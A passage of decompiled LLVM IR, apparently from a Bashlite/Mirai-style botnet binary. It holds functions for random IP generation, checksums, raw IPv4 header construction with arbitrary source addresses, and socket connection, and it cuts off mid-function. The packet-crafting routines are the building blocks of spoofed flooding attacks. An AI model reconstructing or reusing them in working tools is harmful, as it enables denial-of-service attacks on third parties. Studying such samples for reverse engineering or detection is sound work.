  uselistorder label %dec_label_pc_1000770c, { 1, 0 }
  uselistorder label %dec_label_pc_100076b8, { 1, 0 }
  uselistorder label %dec_label_pc_10007664, { 1, 0 }
  uselistorder label %dec_label_pc_10007610, { 1, 0 }
  uselistorder label %dec_label_pc_100075bc, { 1, 0 }
  uselistorder label %dec_label_pc_10007514, { 1, 0 }
  uselistorder label %dec_label_pc_100074c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000746c, { 1, 0 }
  uselistorder label %dec_label_pc_10007418, { 1, 0 }
  uselistorder label %dec_label_pc_100073c4, { 1, 0 }
  uselistorder label %dec_label_pc_10007370, { 1, 0 }
  uselistorder label %dec_label_pc_1000731c, { 1, 0 }
  uselistorder label %dec_label_pc_100072c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007274, { 1, 0 }
  uselistorder label %dec_label_pc_10007220, { 1, 0 }
  uselistorder label %dec_label_pc_100071cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007178, { 1, 0 }
  uselistorder label %dec_label_pc_10007124, { 1, 0 }
  uselistorder label %dec_label_pc_100070d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000707c, { 1, 0 }
  uselistorder label %dec_label_pc_10007028, { 1, 0 }
  uselistorder label %dec_label_pc_10006fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10006f80, { 1, 0 }
  uselistorder label %dec_label_pc_10006f2c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ed8, { 1, 0 }
  uselistorder label %dec_label_pc_10006e84, { 1, 0 }
  uselistorder label %dec_label_pc_10006e30, { 1, 0 }
  uselistorder label %dec_label_pc_10006ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10006d88, { 1, 0 }
  uselistorder label %dec_label_pc_10006d34, { 1, 0 }
  uselistorder label %dec_label_pc_10006ce0, { 1, 0 }
  uselistorder label %dec_label_pc_10006c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10006c38, { 1, 0 }
  uselistorder label %dec_label_pc_10006be4, { 1, 0 }
  uselistorder label %dec_label_pc_10006b90, { 1, 0 }
  uselistorder label %dec_label_pc_10006b3c, { 1, 0 }
  uselistorder label %dec_label_pc_10006ae8, { 1, 0 }
  uselistorder label %dec_label_pc_10006a94, { 1, 0 }
  uselistorder label %dec_label_pc_10006a40, { 1, 0 }
  uselistorder label %dec_label_pc_100069ec, { 1, 0 }
  uselistorder label %dec_label_pc_10006998, { 1, 0 }
  uselistorder label %dec_label_pc_10006944, { 1, 0 }
  uselistorder label %dec_label_pc_100068f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000689c, { 1, 0 }
  uselistorder label %dec_label_pc_10006848, { 1, 0 }
  uselistorder label %dec_label_pc_100067f4, { 1, 0 }
  uselistorder label %dec_label_pc_100067a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000674c, { 1, 0 }
  uselistorder label %dec_label_pc_100066f8, { 1, 0 }
  uselistorder label %dec_label_pc_100066a4, { 1, 0 }
  uselistorder label %dec_label_pc_10006650, { 1, 0 }
  uselistorder label %dec_label_pc_100065fc, { 1, 0 }
  uselistorder label %dec_label_pc_100065a8, { 1, 0 }
  uselistorder label %dec_label_pc_10006554, { 1, 0 }
  uselistorder label %dec_label_pc_10006500, { 1, 0 }
  uselistorder label %dec_label_pc_100064ac, { 1, 0 }
  uselistorder label %dec_label_pc_10006458, { 1, 0 }
  uselistorder label %dec_label_pc_10006404, { 1, 0 }
  uselistorder label %dec_label_pc_100063b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000635c, { 1, 0 }
  uselistorder label %dec_label_pc_10006308, { 1, 0 }
  uselistorder label %dec_label_pc_100062b4, { 1, 0 }
  uselistorder label %dec_label_pc_10006260, { 1, 0 }
  uselistorder label %dec_label_pc_1000620c, { 1, 0 }
  uselistorder label %dec_label_pc_100061b8, { 1, 0 }
  uselistorder label %dec_label_pc_10006164, { 1, 0 }
  uselistorder label %dec_label_pc_10006110, { 1, 0 }
  uselistorder label %dec_label_pc_100060bc, { 1, 0 }
  uselistorder label %dec_label_pc_10006068, { 1, 0 }
  uselistorder label %dec_label_pc_10006014, { 1, 0 }
  uselistorder label %dec_label_pc_10005fc0, { 1, 0 }
  uselistorder label %dec_label_pc_10005f6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005f18, { 1, 0 }
  uselistorder label %dec_label_pc_10005ec4, { 1, 0 }
  uselistorder label %dec_label_pc_10005e70, { 1, 0 }
  uselistorder label %dec_label_pc_10005e1c, { 1, 0 }
  uselistorder label %dec_label_pc_10005dc8, { 1, 0 }
  uselistorder label %dec_label_pc_10005d74, { 1, 0 }
  uselistorder label %dec_label_pc_10005d20, { 1, 0 }
  uselistorder label %dec_label_pc_10005ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10005c78, { 1, 0 }
  uselistorder label %dec_label_pc_10005c24, { 1, 0 }
  uselistorder label %dec_label_pc_10005bd0, { 1, 0 }
  uselistorder label %dec_label_pc_10005b7c, { 1, 0 }
  uselistorder label %dec_label_pc_10005b28, { 1, 0 }
  uselistorder label %dec_label_pc_10005ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10005a80, { 1, 0 }
  uselistorder label %dec_label_pc_10005a2c, { 1, 0 }
  uselistorder label %dec_label_pc_100059d8, { 1, 0 }
  uselistorder label %dec_label_pc_10005984, { 1, 0 }
  uselistorder label %dec_label_pc_10005930, { 1, 0 }
  uselistorder label %dec_label_pc_100058dc, { 1, 0 }
  uselistorder label %dec_label_pc_10005888, { 1, 0 }
  uselistorder label %dec_label_pc_10005834, { 1, 0 }
  uselistorder label %dec_label_pc_100057e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000578c, { 1, 0 }
  uselistorder label %dec_label_pc_10005738, { 1, 0 }
  uselistorder label %dec_label_pc_100056e4, { 1, 0 }
  uselistorder label %dec_label_pc_10005690, { 1, 0 }
  uselistorder label %dec_label_pc_1000563c, { 1, 0 }
  uselistorder label %dec_label_pc_100055e8, { 1, 0 }
  uselistorder label %dec_label_pc_10005594, { 1, 0 }
  uselistorder label %dec_label_pc_10005540, { 1, 0 }
  uselistorder label %dec_label_pc_100054ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005498, { 1, 0 }
  uselistorder label %dec_label_pc_10005444, { 1, 0 }
  uselistorder label %dec_label_pc_100053f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000539c, { 1, 0 }
  uselistorder label %dec_label_pc_10005348, { 1, 0 }
  uselistorder label %dec_label_pc_100052f4, { 1, 0 }
  uselistorder label %dec_label_pc_100052a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000524c, { 1, 0 }
  uselistorder label %dec_label_pc_100051f8, { 1, 0 }
  uselistorder label %dec_label_pc_100051a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005150, { 1, 0 }
  uselistorder label %dec_label_pc_100050fc, { 1, 0 }
  uselistorder label %dec_label_pc_100050a8, { 1, 0 }
  uselistorder label %dec_label_pc_10005054, { 1, 0 }
  uselistorder label %dec_label_pc_10005000, { 1, 0 }
  uselistorder label %dec_label_pc_10004fac, { 1, 0 }
  uselistorder label %dec_label_pc_10004f58, { 1, 0 }
  uselistorder label %dec_label_pc_10004f04, { 1, 0 }
  uselistorder label %dec_label_pc_10004eb0, { 1, 0 }
  uselistorder label %dec_label_pc_10004e5c, { 1, 0 }
  uselistorder label %dec_label_pc_10004e08, { 1, 0 }
  uselistorder label %dec_label_pc_10004db4, { 1, 0 }
  uselistorder label %dec_label_pc_10004d60, { 1, 0 }
  uselistorder label %dec_label_pc_10004d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10004cb8, { 1, 0 }
  uselistorder label %dec_label_pc_10004c64, { 1, 0 }
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
  uselistorder label %dec_label_pc_10004bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10004b68, { 1, 0 }
  uselistorder label %dec_label_pc_10004b14, { 1, 0 }
  uselistorder label %dec_label_pc_10004ac0, { 1, 0 }
  uselistorder label %dec_label_pc_10004a6c, { 1, 0 }
  uselistorder label %dec_label_pc_10004a18, { 1, 0 }
  uselistorder label %dec_label_pc_100049c4, { 1, 0 }
  uselistorder label %dec_label_pc_10004970, { 1, 0 }
  uselistorder label %dec_label_pc_1000491c, { 1, 0 }
  uselistorder label %dec_label_pc_100048c8, { 1, 0 }
  uselistorder label %dec_label_pc_10004874, { 1, 0 }
  uselistorder label %dec_label_pc_10004820, { 1, 0 }
  uselistorder label %dec_label_pc_100047cc, { 1, 0 }
  uselistorder label %dec_label_pc_10004778, { 1, 0 }
  uselistorder label %dec_label_pc_10004724, { 1, 0 }
  uselistorder label %dec_label_pc_100046d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000467c, { 1, 0 }
  uselistorder label %dec_label_pc_10004628, { 1, 0 }
  uselistorder label %dec_label_pc_100045d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004580, { 1, 0 }
  uselistorder label %dec_label_pc_1000452c, { 1, 0 }
  uselistorder label %dec_label_pc_100044d8, { 1, 0 }
  uselistorder label %dec_label_pc_10004484, { 1, 0 }
  uselistorder label %dec_label_pc_10004430, { 1, 0 }
  uselistorder label %dec_label_pc_100043dc, { 1, 0 }
  uselistorder label %dec_label_pc_10004388, { 1, 0 }
  uselistorder label %dec_label_pc_10004334, { 1, 0 }
  uselistorder label %dec_label_pc_100042e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000428c, { 1, 0 }
  uselistorder label %dec_label_pc_10004238, { 1, 0 }
  uselistorder label %dec_label_pc_100041e4, { 1, 0 }
  uselistorder label %dec_label_pc_10004190, { 1, 0 }
  uselistorder label %dec_label_pc_1000413c, { 1, 0 }
  uselistorder label %dec_label_pc_100040e8, { 1, 0 }
  uselistorder label %dec_label_pc_10004094, { 1, 0 }
  uselistorder label %dec_label_pc_10004040, { 1, 0 }
  uselistorder label %dec_label_pc_10003fec, { 1, 0 }
  uselistorder label %dec_label_pc_10003f98, { 1, 0 }
  uselistorder label %dec_label_pc_10003f44, { 1, 0 }
  uselistorder label %dec_label_pc_10003ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10003e9c, { 1, 0 }
  uselistorder label %dec_label_pc_10003e48, { 1, 0 }
  uselistorder label %dec_label_pc_10003df4, { 1, 0 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10003cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10003ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10003c50, { 1, 0 }
  uselistorder label %dec_label_pc_10003bfc, { 1, 0 }
  uselistorder label %dec_label_pc_10003ba8, { 1, 0 }
  uselistorder label %dec_label_pc_10003b54, { 1, 0 }
  uselistorder label %dec_label_pc_10003b00, { 1, 0 }
  uselistorder label %dec_label_pc_10003aac, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58, { 1, 0 }
  uselistorder label %dec_label_pc_10003a04, { 1, 0 }
  uselistorder label %dec_label_pc_100039b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000395c, { 1, 0 }
  uselistorder label %dec_label_pc_10003908, { 1, 0 }
  uselistorder label %dec_label_pc_100038b4, { 1, 0 }
  uselistorder label %dec_label_pc_10003860, { 1, 0 }
  uselistorder label %dec_label_pc_1000380c, { 1, 0 }
  uselistorder label %dec_label_pc_100037b8, { 1, 0 }
  uselistorder label %dec_label_pc_10003764, { 1, 0 }
  uselistorder label %dec_label_pc_10003710, { 1, 0 }
  uselistorder label %dec_label_pc_100036bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003668, { 1, 0 }
  uselistorder label %dec_label_pc_10003614, { 1, 0 }
  uselistorder label %dec_label_pc_100035c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000356c, { 1, 0 }
  uselistorder label %dec_label_pc_10003518, { 1, 0 }
  uselistorder label %dec_label_pc_100034c4, { 1, 0 }
  uselistorder label %dec_label_pc_10003470, { 1, 0 }
  uselistorder label %dec_label_pc_1000341c, { 1, 0 }
  uselistorder label %dec_label_pc_100033c8, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10007850 = load i32, i32* @global_var_100287f8.254, align 4
  store i32 %v3_10007850, i32* @r3, align 4
  %v2_10007858 = call i32 @ntohl(i32 %v3_10007850, i32 268632064)
  %v2_10007864 = and i32 %v2_10007858, %arg1
  %v0_1000786c = call i32 @rand_cmwc()
  %v1_10007878 = sub i32 -1, %arg1
  %v2_1000787c = and i32 %v0_1000786c, %v1_10007878
  %v2_10007884 = xor i32 %v2_1000787c, %v2_10007864
  ret i32 %v2_10007884
}

define i32 @csum(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp21 = call i16 @__decompiler_undefined_function_4()
  %v2_100079143 = icmp sgt i32 %arg2, 1
  br i1 %v2_100079143, label %dec_label_pc_100078cc, label %dec_label_pc_1000791c

dec_label_pc_100078cc:                            ; preds = %entry, %dec_label_pc_100078cc
  %stack_var_-24.08 = phi i16* [ %v5_10007900, %dec_label_pc_100078cc ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v1_10007908, %dec_label_pc_100078cc ], [ %arg2, %entry ]
  %stack_var_-16.06 = phi i32 [ %v5_100078ec, %dec_label_pc_100078cc ], [ 0, %entry ]
  %stack_var_-12.05 = phi i32 [ %v2_100078e8, %dec_label_pc_100078cc ], [ 0, %entry ]
  %v4_100078cc = ptrtoint i16* %stack_var_-24.08 to i32
  %v2_100078d0 = load i16, i16* %stack_var_-24.08, align 2
  %v3_100078d0 = zext i16 %v2_100078d0 to i32
  %v2_100078e8 = add i32 %v3_100078d0, %stack_var_-12.05
  %v3_100078e8 = icmp ult i32 %v2_100078e8, %stack_var_-12.05
  %v4_100078ec = zext i1 %v3_100078e8 to i32
  %v5_100078ec = add i32 %v4_100078ec, %stack_var_-16.06
  %v1_100078fc = add i32 %v4_100078cc, 2
  %v5_10007900 = inttoptr i32 %v1_100078fc to i16*
  %v1_10007908 = add nsw i32 %stack_var_-20.07, -2
  %v2_10007914 = icmp sgt i32 %v1_10007908, 1
  br i1 %v2_10007914, label %dec_label_pc_100078cc, label %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge

dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge: ; preds = %dec_label_pc_100078cc
  %v3_10007914.le = icmp eq i32 %v1_10007908, 1
  br i1 %v3_10007914.le, label %dec_label_pc_10007928, label %dec_label_pc_10007994.preheader

dec_label_pc_1000791c:                            ; preds = %entry
  %v3_100079144 = icmp eq i32 %arg2, 1
  br i1 %v3_100079144, label %dec_label_pc_10007928, label %dec_label_pc_10007994.preheader

dec_label_pc_10007928:                            ; preds = %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge, %dec_label_pc_1000791c
  %stack_var_-24.0.lcssa20 = phi i16* [ %v5_10007900, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ %arg1, %dec_label_pc_1000791c ]
  %stack_var_-16.0.lcssa19 = phi i32 [ %v5_100078ec, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ]
  %stack_var_-12.0.lcssa18 = phi i32 [ %v2_100078e8, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ]
  %v1_1000792c = bitcast i16* %stack_var_-24.0.lcssa20 to i8*
  %v2_1000792c = load i8, i8* %v1_1000792c, align 1
  %v3_1000792c = zext i8 %v2_1000792c to i32
  %v2_10007944 = add i32 %v3_1000792c, %stack_var_-12.0.lcssa18
  %v3_10007944 = icmp ult i32 %v2_10007944, %stack_var_-12.0.lcssa18
  %v4_10007948 = zext i1 %v3_10007944 to i32
  %v5_10007948 = add i32 %v4_10007948, %stack_var_-16.0.lcssa19
  br label %dec_label_pc_10007994.preheader

dec_label_pc_10007994.preheader:                  ; preds = %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge, %dec_label_pc_10007928, %dec_label_pc_1000791c
  %stack_var_-12.1.ph = phi i32 [ %v2_100078e8, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ], [ %v2_10007944, %dec_label_pc_10007928 ]
  %stack_var_-16.1.ph = phi i32 [ %v5_100078ec, %dec_label_pc_10007910.dec_label_pc_1000791c_crit_edge ], [ 0, %dec_label_pc_1000791c ], [ %v5_10007948, %dec_label_pc_10007928 ]
  %v1_1000799829 = mul i32 %stack_var_-16.1.ph, 65536
  %v1_100079a030 = udiv i32 %stack_var_-12.1.ph, 65536
  %v2_100079a431 = or i32 %v1_1000799829, %v1_100079a030
  %v1_100079ac32 = udiv i32 %stack_var_-16.1.ph, 65536
  %v2_100079b433 = or i32 %v2_100079a431, %v1_100079ac32
  %v3_100079b834 = icmp eq i32 %v2_100079b433, 0
  br i1 %v3_100079b834, label %dec_label_pc_100079c0, label %dec_label_pc_10007958

dec_label_pc_10007958:                            ; preds = %dec_label_pc_10007994.preheader, %dec_label_pc_10007958
  %v1_100079ac37 = phi i32 [ %v1_100079ac, %dec_label_pc_10007958 ], [ %v1_100079ac32, %dec_label_pc_10007994.preheader ]
  %v2_100079a436 = phi i32 [ %v2_100079a4, %dec_label_pc_10007958 ], [ %v2_100079a431, %dec_label_pc_10007994.preheader ]
  %stack_var_-12.135 = phi i32 [ %v2_10007984, %dec_label_pc_10007958 ], [ %stack_var_-12.1.ph, %dec_label_pc_10007994.preheader ]
  %v1_10007964 = urem i32 %stack_var_-12.135, 65536
  %v2_10007984 = add i32 %v2_100079a436, %v1_10007964
  %v3_10007984 = icmp ult i32 %v2_10007984, %v1_10007964
  %v4_10007988 = zext i1 %v3_10007984 to i32
  %v5_10007988 = add nuw nsw i32 %v4_10007988, %v1_100079ac37
  %v1_10007998 = mul i32 %v5_10007988, 65536
  %v1_100079a0 = udiv i32 %v2_10007984, 65536
  %v2_100079a4 = or i32 %v1_10007998, %v1_100079a0
  %v1_100079ac = udiv i32 %v5_10007988, 65536
  %v2_100079b4 = or i32 %v2_100079a4, %v1_100079ac
  %v3_100079b8 = icmp eq i32 %v2_100079b4, 0
  br i1 %v3_100079b8, label %dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge, label %dec_label_pc_10007958

dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge: ; preds = %dec_label_pc_10007958
  br label %dec_label_pc_100079c0

dec_label_pc_100079c0:                            ; preds = %dec_label_pc_10007994.dec_label_pc_100079c0_crit_edge, %dec_label_pc_10007994.preheader
  %v4_100079c0 = zext i16 %tmp21 to i32
  %v1_100079cc = xor i32 %v4_100079c0, 65535
  ret i32 %v1_100079cc

; uselistorder directives
  uselistorder i32 %v2_100079a4, { 1, 0 }
  uselistorder i32 %v5_10007988, { 1, 0 }
  uselistorder i32 %v2_10007984, { 0, 2, 1 }
  uselistorder i32 %v1_100079ac32, { 1, 0 }
  uselistorder i32 %stack_var_-16.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.1.ph, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa18, { 1, 0 }
  uselistorder i32 %v1_10007908, { 0, 2, 1 }
  uselistorder i32 %v2_100078e8, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-12.05, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007958, { 1, 0 }
  uselistorder label %dec_label_pc_10007994.preheader, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10007928, { 1, 0 }
  uselistorder label %dec_label_pc_100078cc, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-64 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100079e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100079e4, i32* %stack_var_-64, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10007a10 = add i32 %arg1, 12
  %v2_10007a10 = inttoptr i32 %v1_10007a10 to i32*
  %v3_10007a10 = load i32, i32* %v2_10007a10, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10007a1c = add i32 %arg1, 16
  %v2_10007a1c = inttoptr i32 %v1_10007a1c to i32*
  %v3_10007a1c = load i32, i32* %v2_10007a1c, align 4
  store i32 20, i32* @r3, align 4
  %v1_10007a38 = call i32 @htons(i32 20)
  store i32 32, i32* @r3, align 4
  store i32 268466776, i32* @lr, align 4
  %v0_10007a54 = call i32 @malloc()
  store i32 %v0_10007a54, i32* %r11.global-to-local, align 4
  store i32 %v3_10007a1c, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10007a74 = inttoptr i32 %v0_10007a54 to i32*
  store i32 %v3_10007a10, i32* %v2_10007a74, align 4
  %v0_10007a78 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007a78 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007a78 = add i32 %v1_10007a78, 4
  %v3_10007a78 = inttoptr i32 %v2_10007a78 to i32*
  store i32 %v0_10007a78, i32* %v3_10007a78, align 4
  %v0_10007a7c = load i32, i32* %r9.global-to-local, align 4
  %v1_10007a7c = load i32, i32* %r11.global-to-local, align 4
  %v2_10007a7c = add i32 %v1_10007a7c, 8
  %v3_10007a7c = inttoptr i32 %v2_10007a7c to i32*
  store i32 %v0_10007a7c, i32* %v3_10007a7c, align 4
  %v1_10007a84 = add i32 %v0_10007a54, 12
  store i32 %v1_10007a84, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_10007a8c = load i32, i32* %arg2, align 4
  %v1_10007a90 = add i32 %tmp, 4
  %v2_10007a90 = inttoptr i32 %v1_10007a90 to i32*
  %v3_10007a90 = load i32, i32* %v2_10007a90, align 4
  store i32 %v3_10007a90, i32* %r10.global-to-local, align 4
  %v1_10007a94 = add i32 %tmp, 8
  %v2_10007a94 = inttoptr i32 %v1_10007a94 to i32*
  %v3_10007a94 = load i32, i32* %v2_10007a94, align 4
  %v1_10007a98 = add i32 %tmp, 12
  %v2_10007a98 = inttoptr i32 %v1_10007a98 to i32*
  %v3_10007a98 = load i32, i32* %v2_10007a98, align 4
  %v2_10007a9c = inttoptr i32 %v1_10007a84 to i32*
  store i32 %v2_10007a8c, i32* %v2_10007a9c, align 4
  %v0_10007aa0 = load i32, i32* %r10.global-to-local, align 4
  %v1_10007aa0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa0 = add i32 %v1_10007aa0, 4
  %v3_10007aa0 = inttoptr i32 %v2_10007aa0 to i32*
  store i32 %v0_10007aa0, i32* %v3_10007aa0, align 4
  %v1_10007aa4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa4 = add i32 %v1_10007aa4, 8
  %v3_10007aa4 = inttoptr i32 %v2_10007aa4 to i32*
  store i32 %v3_10007a94, i32* %v3_10007aa4, align 4
  %v1_10007aa8 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007aa8 = add i32 %v1_10007aa8, 12
  %v3_10007aa8 = inttoptr i32 %v2_10007aa8 to i32*
  store i32 %v3_10007a98, i32* %v3_10007aa8, align 4
  %v1_10007aac = add i32 %tmp, 16
  %v2_10007aac = inttoptr i32 %v1_10007aac to i32*
  %v3_10007aac = load i32, i32* %v2_10007aac, align 4
  %v1_10007ab0 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007ab0 = add i32 %v1_10007ab0, 16
  %v3_10007ab0 = inttoptr i32 %v2_10007ab0 to i32*
  store i32 %v3_10007aac, i32* %v3_10007ab0, align 4
  %v5_10007abc = inttoptr i32 %v0_10007a54 to i16*
  %v6_10007abc = call i32 @csum(i16* %v5_10007abc, i32 32, i32 %v3_10007a98, i32 %v3_10007a94, i32 %tmp)
  %sext = mul i32 %v6_10007abc, 65536
  %v1_10007ac0 = sdiv i32 %sext, 65536
  store i32 %v0_10007a54, i32* @r3, align 4
  store i32 268466896, i32* @lr, align 4
  %v0_10007acc = call i32 @free()
  %v1_10007ad4 = urem i32 %v1_10007ac0, 65536
  %v2_10007adc = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_10007adc, i32* %r11.global-to-local, align 4
  ret i32 %v1_10007ad4

; uselistorder directives
  uselistorder i32 %v0_10007a54, { 3, 2, 1, 0, 4 }
  uselistorder i32 %tmp, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8 }
}

define i32 @makeIPPacket(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp1 = ptrtoint i32* %arg1 to i32
  %v1_10007b2c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007b2c, i32* %arg1, align 4
  %v1_10007b40 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10007b40, i32* %arg1, align 4
  %v3_10007b50 = add i32 %tmp1, 1
  %v4_10007b50 = inttoptr i32 %v3_10007b50 to i8*
  store i8 0, i8* %v4_10007b50, align 1
  %fold = add i32 %arg5, 20
  %v1_10007b68 = trunc i32 %fold to i16
  %v3_10007b68 = add i32 %tmp1, 2
  %v4_10007b68 = inttoptr i32 %v3_10007b68 to i16*
  store i16 %v1_10007b68, i16* %v4_10007b68, align 2
  %v0_10007b6c = call i32 @rand_cmwc()
  %v1_10007b7c = trunc i32 %v0_10007b6c to i16
  %v3_10007b7c = add i32 %tmp1, 4
  %v4_10007b7c = inttoptr i32 %v3_10007b7c to i16*
  store i16 %v1_10007b7c, i16* %v4_10007b7c, align 2
  %v3_10007b88 = add i32 %tmp1, 6
  %v4_10007b88 = inttoptr i32 %v3_10007b88 to i16*
  store i16 0, i16* %v4_10007b88, align 2
  %v3_10007b94 = add i32 %tmp1, 8
  %v4_10007b94 = inttoptr i32 %v3_10007b94 to i8*
  store i8 -1, i8* %v4_10007b94, align 1
  %v3_10007ba0 = add i32 %tmp1, 9
  %v4_10007ba0 = inttoptr i32 %v3_10007ba0 to i8*
  store i8 %tmp, i8* %v4_10007ba0, align 1
  %v3_10007bac = add i32 %tmp1, 10
  %v4_10007bac = inttoptr i32 %v3_10007bac to i16*
  store i16 0, i16* %v4_10007bac, align 2
  %v2_10007bb8 = add i32 %tmp1, 12
  %v3_10007bb8 = inttoptr i32 %v2_10007bb8 to i32*
  store i32 %arg3, i32* %v3_10007bb8, align 4
  %v2_10007bc4 = add i32 %tmp1, 16
  %v3_10007bc4 = inttoptr i32 %v2_10007bc4 to i32*
  store i32 %arg2, i32* %v3_10007bc4, align 4
  ret i32 %v0_10007b6c
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_10007bfc = icmp sgt i32 %arg1, 2
  br i1 %v2_10007bfc, label %dec_label_pc_10007c10, label %dec_label_pc_10007c20

dec_label_pc_10007c10:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10007c18.255 to i32), i32* @lr, align 4
  %v1_10007c14 = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_10007c20

dec_label_pc_10007c20:                            ; preds = %entry, %dec_label_pc_10007c10
  %storemerge = phi i32 [ 0, %dec_label_pc_10007c10 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_10007c20, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  store i32 268467312, i32* @lr, align 4
  %v1_10007c6c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10007c7c = icmp eq i32 %v1_10007c6c, 0
  br i1 %v3_10007c7c, label %dec_label_pc_10007c84, label %dec_label_pc_10007c90

dec_label_pc_10007c84:                            ; preds = %entry
  br label %dec_label_pc_10007d68

dec_label_pc_10007c90:                            ; preds = %entry
  %v1_10007c94 = add i32 %v1_10007c6c, 16
  %v2_10007c94 = inttoptr i32 %v1_10007c94 to i32*
  %v3_10007c94 = load i32, i32* %v2_10007c94, align 4
  %v1_10007c98 = inttoptr i32 %v3_10007c94 to i32*
  %v2_10007c98 = load i32, i32* %v1_10007c98, align 4
  %v1_10007ca0 = add i32 %v1_10007c6c, 12
  %v2_10007ca0 = inttoptr i32 %v1_10007ca0 to i32*
  %v3_10007ca0 = load i32, i32* %v2_10007ca0, align 4
  %v2_10007ca8 = ptrtoint i32* %stack_var_-48 to i32
  %v2_10007cac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v3_10007ca0, i32* @r5, align 4
  store i32 268467392, i32* @lr, align 4
  %v4_10007cbc = call i32 @bcopy(i32 %v2_10007c98, i32 %v2_10007cac, i32 %v3_10007ca0, i32 %v2_10007ca8)
  %v4_10007cc0 = zext i16 %arg2 to i32
  store i32 %v4_10007cc0, i32* @r3, align 4
  %v1_10007ccc = call i32 @htons(i32 %v4_10007cc0)
  store i32 2, i32* %stack_var_-48, align 4
  store i32 268467440, i32* @lr, align 4
  %v3_10007cec = call i32 @socket(i32 2, i32 1, i32 6)
